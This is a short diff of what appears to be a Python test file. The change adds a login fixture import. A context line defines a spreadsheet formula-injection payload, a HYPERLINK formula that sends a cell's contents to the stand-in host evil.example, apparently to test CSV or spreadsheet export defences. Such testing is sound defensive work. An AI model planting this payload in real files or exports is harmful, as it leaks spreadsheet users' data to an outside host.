@@ -13,6 +13,7 @@ from app.workers.queue import get_queue
 from sqlalchemy import select
 
 from tests import studio_support
+from tests.api_fixtures import login
 
 bahar = studio_support.bahar
 EVIL = '=HYPERLINK("http://evil.example/?"&A1,"Click")'
